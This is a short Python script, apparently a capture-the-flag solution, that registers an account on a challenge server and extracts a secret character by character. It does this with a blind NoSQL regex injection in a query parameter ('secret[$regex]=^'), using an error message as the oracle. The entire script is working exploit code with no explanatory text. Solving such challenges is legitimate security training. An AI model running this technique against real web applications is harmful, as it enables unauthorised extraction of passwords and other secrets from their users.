from requests import *
from string import ascii_letters, digits

host = "http://pugwar.challs.srdnlen.it"
path_solve = "/fighter-customization?pugName=Mario&secret[$regex]=^"
path_register = "/register-user"
flag = ""

alphabet = ascii_letters + digits + '{}_'

def register_user(username, password):
    r = session.post(f'{host}{path_register}', json={'username': username, 'password': password})


session = Session()
register_user('pysu12', 'axstral12')

while not flag.endswith("}"):
    for c in alphabet:
        response = session.get(f"{host}{path_solve}{flag}{c}")
        if("You can&#x27;t customize other players fighter!" in response.text):
            flag = flag + c
            

print(flag)
